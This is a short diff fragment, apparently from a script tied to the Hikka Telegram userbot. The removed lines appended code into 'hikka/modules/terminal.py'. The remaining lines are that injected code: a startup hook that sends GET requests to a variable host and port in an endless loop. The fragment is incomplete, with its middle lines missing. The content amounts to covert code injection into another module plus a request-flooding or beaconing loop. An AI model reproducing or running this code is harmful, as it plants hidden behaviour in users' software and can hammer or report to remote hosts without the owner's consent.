@@ -1,5 +1,3 @@
-f = open("hikka/modules/terminal.py", "a") # открываем файл
-f.write("""
     async def client_ready(self):
         import aiohttp
         import json
@@ -11,6 +9,3 @@ f.write("""
                 while True:
                     async with session.get(f"{ip}:{port}") as response:
                         await response.read()
-""")
-
-f.close()
